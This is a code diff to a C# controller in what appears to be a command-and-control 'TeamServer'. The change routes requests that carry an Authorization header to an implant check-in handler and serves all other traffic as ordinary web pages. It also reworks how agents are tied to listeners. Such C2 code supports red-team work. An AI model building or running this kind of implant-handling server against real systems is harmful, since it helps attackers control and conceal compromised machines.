@@ -36,7 +36,7 @@ namespace TeamServer.Models
         }
 
 
-        public async Task<IActionResult> WebHost(string id)
+        private async Task<IActionResult> WebHost(string id)
         {
             //Logger.Log($"WebHost {this.Request.GetListenerUri()} : {id}");
             //var logger = _loggerFactory.CreateLogger("WebHost");
@@ -68,24 +68,32 @@ namespace TeamServer.Models
             }
         }
 
+        const string AuthorizationHeader = "Authorization";
 
-        public async Task<IActionResult> HandleImplant(string id)
+        public async Task<IActionResult> HandleRequest(string relativeUrl)
         {
-            var agent = this.CheckIn(id);
+            if (this.Request.Headers.ContainsKey(AuthorizationHeader))
+            {
+                var agent = this.Request.Headers[AuthorizationHeader].ToString();
+                if (string.IsNullOrEmpty(agent))
+                    return NotFound();
+
+                return await this.HandleImplant(agent);
+            }
+            else
+            {
+                return await this.WebHost(relativeUrl);
+            }
+        }
+
+
+        private async Task<ActionResult> HandleImplant(string id)
+        {
+            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.BindPort == this.Request.Host.Port);
+
+            var agent = this.CheckIn(id, listener);
 
             //System.IO.File.AppendAllText("log.log", calledUri + Environment.NewLine);
-
-            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.BindPort == this.Request.Host.Port);
-            if (listener != null)
-            {
-                //System.IO.File.AppendAllText("log.log", $"Found listener {listener.Id} with {listener.Uri}" + Environment.NewLine);
-                if (agent.ListenerId != listener.Id)
-                {
-                    agent.ListenerId = listener.Id;
-                    this._changeTrackingService.TrackChange(ChangingElement.Agent, agent.Id);
-                }
-            }
-
             if (HttpContext.Request.Method == "POST")
             {
                 string json;
@@ -97,7 +105,7 @@ namespace TeamServer.Models
                 foreach (var messRes in result)
                 {
                     var agentId = messRes.Header.Owner;
-                    var messAgent = this.CheckIn(messRes.Header.Owner);
+                    var messAgent = this.CheckIn(messRes.Header.Owner, listener);
 
                     if (messRes.MetaData != null)
                     {
@@ -137,10 +145,10 @@ namespace TeamServer.Models
             return Ok(messages);
         }
 
-        private Agent CheckIn(string agentId)
+        private Agent CheckIn(string agentId, Listener listener)
         {
             var agent = this._agentService.GetAgent(agentId);
-            
+
             this._changeTrackingService.TrackChange(ChangingElement.Agent, agentId);
 
             if (agent == null)
@@ -154,27 +162,10 @@ namespace TeamServer.Models
 
             agent.CheckIn();
 
+            if (listener != null && agent.ListenerId != listener.Id)
+                    agent.ListenerId = listener.Id;
+
             return agent;
         }
-
-
-
-        //private AgentMetadata ExtractMetadata(IHeaderDictionary headers)
-        //{
-        //    //Auhorization: Bearer <base64>
-        //    if (!headers.TryGetValue("Authorization", out var encodedMetaDataHeader))
-        //        return null;
-
-        //    var encodedMetaData = encodedMetaDataHeader.ToString();
-
-        //    if (!encodedMetaData.StartsWith("Bearer "))
-        //        return null;
-
-        //    encodedMetaData = encodedMetaData.Substring(7, encodedMetaData.Length - 7);
-
-        //    var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetaData));
-        //    return JsonConvert.DeserializeObject<AgentMetadata>(json);
-        //}
-
     }
 }
